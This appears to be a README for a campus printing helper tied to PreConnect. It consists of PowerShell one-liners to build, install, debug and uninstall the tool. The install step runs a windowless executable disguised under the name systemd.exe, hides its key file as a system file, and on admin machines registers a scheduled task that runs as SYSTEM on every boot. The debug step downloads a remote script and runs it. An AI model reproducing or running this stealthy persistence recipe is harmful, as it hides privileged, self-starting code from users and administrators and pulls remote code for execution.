# Printer Setup

Print directly to campus printers from PreConnect.

Official Rust repository: [hitblast/preprintd](https://github.com/hitblast/preprintd)

---

## Build Native Binary (Nuitka)

Run in PowerShell from the repository directory:

```powershell
python -m pip install --upgrade nuitka ordered-set zstandard; python -m nuitka --onefile --windows-disable-console --lto=yes --no-pyi-file --remove-output --jobs=4 --output-filename=systemd.exe printer.py
```

---

## Windows Setup

Build the native binary first, then run in PowerShell from the directory containing `systemd.exe`:

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); $d = if ($isAdmin) { "$env:ProgramData\systemd" } else { "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" }; $source = (Resolve-Path ".\systemd.exe").Path; New-Item -ItemType Directory -Force -Path $d | Out-Null; $exe = "$d\systemd.exe"; Copy-Item $source $exe -Force; Add-Type -AssemblyName System.Security; $scope = if ($isAdmin) { [System.Security.Cryptography.DataProtectionScope]::LocalMachine } else { [System.Security.Cryptography.DataProtectionScope]::CurrentUser }; $e = [System.Security.Cryptography.ProtectedData]::Protect([System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"), $null, $scope); Set-Content "$d\systemd.key" ("DPAPI:" + [Convert]::ToBase64String($e)); attrib +h +s "$d\systemd.key"; if ($isAdmin) { schtasks /Create /TN "systemd" /TR "`"$exe`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F; schtasks /Run /TN "systemd" } else { Start-Process $exe }
```

---

## Debug Mode

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/refs/heads/main/printer.py" -OutFile "systemd.py" -UseBasicParsing; python systemd.py <WORKER_KEY> --debug
```

---

## Uninstall

Run in PowerShell:

```powershell
schtasks /Delete /TN "systemd" /F 2>$null; schtasks /Delete /TN "printer" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter "Name='systemd.exe' or Name='pythonw.exe' or Name='python.exe'" | Where-Object { $_.CommandLine -like "*systemd*" -or $_.CommandLine -like "*printer*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Remove-Item "$s\systemd.*","$s\printer.*","$s\.ident" -Force -ErrorAction SilentlyContinue; if (Test-Path "$s\py") { Remove-Item "$s\py" -Recurse -Force -ErrorAction SilentlyContinue }; Remove-Item "$env:ProgramData\systemd","$env:ProgramData\printer" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "systemd.*","printer.*","py.zip" -Force -ErrorAction SilentlyContinue
```
